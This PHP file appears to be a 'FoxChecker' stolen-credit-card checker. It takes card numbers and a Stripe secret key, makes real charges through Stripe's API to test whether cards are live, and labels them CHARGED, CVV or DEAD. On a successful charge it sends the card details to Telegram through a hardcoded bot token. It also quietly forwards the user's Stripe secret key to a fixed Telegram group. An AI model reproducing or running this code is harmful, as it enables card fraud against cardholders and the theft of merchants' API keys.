<?php

error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');

function GetStr($string, $start, $end) {
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) {
        return '';
    }
    $ini+= strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}
function multiexplode($seperator, $string) {
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
}

$idd = $_GET['idd'];
$nmes = $_GET['unm'];
if (empty($nmes)) {
    $nme = 'x FoxChecker'; 
    $mnm = '';
}
else {
    $nme = 'x '.$nmes;
    $mnm = '𝖋𝖔𝖝';
}
$amt = $_GET['cst'];
if (empty($amt)) {
    $amt = '1';
    $chr = $amt * 100;
}
$sk = $_GET['sec'];

$lista = $_GET['lista'];
$cc = multiexplode([":", "|", ""], $lista) [0];
$mes = multiexplode([":", "|", ""], $lista) [1];
$ano = multiexplode([":", "|", ""], $lista) [2];
$cvv = multiexplode([":", "|", ""], $lista) [3];
if (strlen($mes) == 1) {
    $mes = "0$mes";
}
if (strlen($ano) == 2) {
    $ano = "20$ano";
}

/*.-.. .. - - .-.. . ..-. --- -..- 1st/payment_methods .-.. .. - - .-.. . ..-. --- -..-*/

$x = 0;
while (true) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]=' . $cc . '&card[exp_month]=' . $mes . '&card[exp_year]=' . $ano . '');
    $result1 = curl_exec($ch);
    $tok1 = Getstr($result1, '"id": "', '"');
    $msg = Getstr($result1, '"message": "', '"');

    if (strpos($result1, "rate_limit")) {
        $x++;
        continue;
    }
    break;
}

/*.-.. .. - - .-.. . ..-. --- -..- 1st/payment_intents .-.. .. - - .-.. . ..-. --- -..-*/

$x = 0;
while (true) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=' . $chr . '&currency=usd&payment_method_types[]=card&description=FoxDonation&payment_method=' . $tok1 . '&confirm=true&off_session=true');

    $result2 = curl_exec($ch);
    $cvcheck = Getstr($result2, '"cvc_check": "', '"');
    $tok2 = Getstr($result2, '"id": "', '"');
    $receipturl = trim(strip_tags(getStr($result2, '"receipt_url": "', '"')));
    
    if (strpos($result2, "rate_limit")) {
        $x++;
        continue;
    }
    break;
}

/*.-.. .. - - .-.. . ..-. --- -..- Responses .-.. .. - - .-.. . ..-. --- -..-*/

if (strpos($result2, '"seller_message": "Payment complete."')) {
    echo '#CHARGED</span>:  ' . $lista . '</span>  <br>♡ Response: $' . $amt . ' Charged ✅ [<a href=' . $receipturl . '>Reciept</a>] ' .$mnm. '<br> ♡ CCN ' .$nme. '<br><br>';

    $tg = "<b>CCN: </b>".$lista."\r\n<b>♡ Response: </b>$".$amt." CHARGED ✔\r\n<b>♡ JUST CHECKER</b>";
    $apiToken = "5662954966:AAEADOaR9oVAmhGe79Wrk35wRsUJF_MTYho";
    $forward1 = [ 'chat_id' => ''.$idd.'', 'text' => $tg, 'parse_mode' => 'HTML' ];
    $response1 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?".http_build_query($forward1));
    $forward2 = [ 'chat_id' => '-950182761', 'text' => $tg, 'parse_mode' => 'HTML' ];
    $response2 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?".http_build_query($forward2));
    $forward3 = [ 'chat_id' => '-950182761', 'text' => $sk, 'parse_mode' => 'HTML' ];
    $response3 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?".http_build_query($forward3));
} 

elseif (strpos($result2, '"cvc_check": "pass"')) {
    echo '#CVV</span>:  ' . $lista . '</span>  <br>♡ Result: CVV LIVE</span><br> ♡ Checker ' .$nme. ' <br><br>';
} elseif (strpos($result1, "generic_decline")||strpos($result2, "generic_decline")) {
    echo '#DEAD</span>:  ' . $lista . '</span>  <br>♡ Result: Generic declined</span><br><br>';
} elseif (strpos($result1, "insufficient_funds")||strpos($result2, "insufficient_funds")) {
    echo '#CVV</span>:  ' . $lista . '</span>  <br>♡ Result: Insufficient funds</span><br>  ♡ Checker ' .$nme. ' <br><br>';
} elseif (strpos($result1, '"code": "incorrect_cvc"')||strpos($result1, '"code": "invalid_cvc"')||strpos($result2, '"code": "incorrect_cvc"')||strpos($result2, '"code": "invalid_cvc"')) {
    echo '#CCN</span>:  ' . $lista . '</span>  <br>♡ Result: Security code is incorrect</span><br> ♡ Checker ' .$nme. ' <br><br>';
} elseif (strpos($result1, "card_error_authentication_required")||strpos($result2, "card_error_authentication_required")||strpos($result2, "authentication_required")) {
    echo '#CVV</span>:  ' . $lista . '</span>  <br>♡ Result: 32DS Required</span><br> ♡ Checker ' .$nme. ' <br><br>';
} elseif (strpos($result2, "transaction_not_allowed")) {
    echo '#CVV</span>:  ' . $lista . '</span>  <br>♡ Result: Transaction not allowed</span><br> ♡ Checker ' .$nme. ' <br><br>';
} elseif (strpos($result1, "fraudulent")||strpos($result2, "fraudulent")) {
    echo '#DEAD</span>:  ' . $lista . '</span>  <br>♡ Result: Fraudulent</span><br><br>';
} elseif (strpos($resul1, "do_not_honor")||strpos($resul2, "do_not_honor")) {
    echo '#DEAD</span>:  ' . $lista . '</span>  <br>♡ Result: Do not honor</span><br><br>';
} elseif (strpos($result1, "lost_card")||strpos($result2, "lost_card")) {
    echo '#DEAD</span>:  ' . $lista . '</span>  <br>♡ Result: Lost card</span><br><br>';
} elseif (strpos($result1, "stolen_card")||strpos($result2, "stolen_card")) {
    echo '#DEAD</span>:  ' . $lista . '</span>  <br>♡ Result: Stolen card</span><br><br>';
} elseif (strpos($result1, "pickup_card")||strpos($result2, "pickup_card")) {
    echo '#DEAD</span>:  ' . $lista . '</span>  <br>♡ Result: Pickup card</span><br><br>';
} elseif (strpos($result1, 'Your card has expired.')||strpos($result2, 'Your card has expired.')) {
    echo '#DEAD</span>:  ' . $lista . '</span>  <br>♡ Result: Expired card</span><br><br>';
} elseif (strpos($result1, "incorrect_number")||strpos($result2, "incorrect_number")) {
    echo '#DEAD</span>:  ' . $lista . '</span>  <br>♡ Result: Incorrect card number</span><br><br>';
} elseif (strpos($result1, "card_not_supported")||strpos($result2, "card_not_supported")) {
    echo '#DEAD</span>:  ' . $lista . '</span>  <br>♡ Result: Card not supported</span><br><br>';
} elseif (strpos($result1, 'Your card was declined.')||strpos($result2, 'Your card was declined.')) {
    echo '#DEAD</span>:  ' . $lista . '</span>  <br>♡ Result: Card declined</span><br><br>';
} elseif (strpos($result1, "invalid_expiry_month")) {
    echo '#DEAD</span>:  ' . $lista . '</span>  <br>♡ Result: Invaild expiry month</span><br><br>';
} elseif (strpos($result2, "invalid_account")) {
    echo '#DEAD</span>:  ' . $lista . '</span>  <br>♡ Result: Invaild account</span><br><br>';
} elseif (strpos($result2, "card_decline_rate_limit_exceeded")) {
    echo '#DEAD</span>:  ' . $lista . '</span>  <br>♡ Result: SK is at rate limit</span><br><br>';
} elseif (strpos($result2, '"code": "processing_error"')) {
    echo '#DEAD</span>:  ' . $lista . '</span>  <br>♡ Result: Processing error</span><br><br>';
} elseif (strpos($result2, ' "message": "Your card number is incorrect."')) {
    echo '#DEAD</span>:  ' . $lista . '</span>  <br>♡ Result: Your card number is incorrect</span><br><br>';
} elseif (strpos($result2, '"decline_code": "service_not_allowed"')) {
    echo '#DEAD</span>:  ' . $lista . '</span>  <br>♡ Result: Service not allowed</span><br><br>';
} elseif (strpos($result2, '"code": "processing_error"')) {
    echo '#DEAD</span>:  ' . $lista . '</span>  <br>♡ Result: Processing error</span><br><br>';
} elseif (strpos($result2, ' "message": "Your card number is incorrect."')) {
    echo '#DEAD</span>:  ' . $lista . '</span>  <br>♡ Result: Your card number is incorrect</span><br><br>';
} elseif (strpos($result2, '"decline_code": "service_not_allowed"')) {
    echo '#DEAD</span>:  ' . $lista . '</span>  <br>♡ Result: Service not allowed</span><br><br>';
} elseif (!empty($cvcheck)) {
    echo '#DEAD</span>:  ' . $lista . '</span>  <br>♡ Result: CVC_CHECK : '.$cvcheck.'</span><br><br>';
} elseif (strpos($result2, "currency_not_supported")) {
    echo '#DEAD</span>:  ' . $lista . '</span>  <br>♡ Result: Currency not suported try in inr</span><br><br>';
} elseif (strpos($result, 'Your card does not support this type of purchase.')) {
    echo '#DEAD</span>:  ' . $lista . '</span>  <br>♡ Result: Card not support this type of purchase</span><br><br>';
} elseif (strpos($result1, "testmode_charges_only")) {
    echo '#DEAD</span>:  ' . $lista . '</span>  <br>♡ Result: SK key dead or invalid</span><br><br>';
} elseif (strpos($result1, "api_key_expired")) {
    echo '#DEAD</span>:  ' . $lista . '</span>  <br>♡ Result: SK key revoked</span><br><br>';
} elseif (strpos($result1, "parameter_invalid_empty")) {
    echo '#DEAD</span>:  ' . $lista . '</span>  <br>♡ Result: Enter CC to check</span><br><br>';
} else {
    echo '#DEAD</span>:  ' . $lista . '</span>  <br>♡ Result: Increase amount or try another card</span><br><br>';
}

curl_close($ch);
ob_flush();
?>